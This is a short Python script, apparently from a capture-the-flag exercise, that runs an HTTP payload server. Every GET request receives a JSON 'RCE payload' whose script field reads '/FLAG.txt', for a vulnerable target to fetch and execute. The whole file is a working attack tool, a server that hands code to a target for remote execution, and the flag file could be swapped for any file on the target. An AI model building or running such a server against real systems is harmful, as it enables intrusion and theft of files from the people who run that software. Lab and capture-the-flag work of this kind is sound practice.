#!/usr/bin/env python3
import http.server
import socketserver
import json
from datetime import datetime

class PayloadHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Log the request
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] GET request from {self.client_address[0]}:{self.client_address[1]}")
        print(f"[{timestamp}] Path: {self.path}")
        
        # Prepare JSON payload for RCE
        payload = {
            "script": "open('/FLAG.txt').read()"
        }
        
        # Convert to JSON
        response_data = json.dumps(payload)
        
        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(response_data)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Write response body
        self.wfile.write(response_data.encode('utf-8'))
        
        print(f"[{timestamp}] Sent payload: {response_data}")
    
    def log_message(self, format, *args):
        # Override to customize logging
        pass

PORT = 8000
HOST = '0.0.0.0'

print(f"Starting payload server on {HOST}:{PORT}")
print(f"Serving RCE payload: {json.dumps({'script': 'open(\'/FLAG.txt\').read()'})}")
print("-" * 60)

with socketserver.TCPServer((HOST, PORT), PayloadHandler) as httpd:
    print(f"Server is listening on {HOST}:{PORT}")
    httpd.serve_forever()
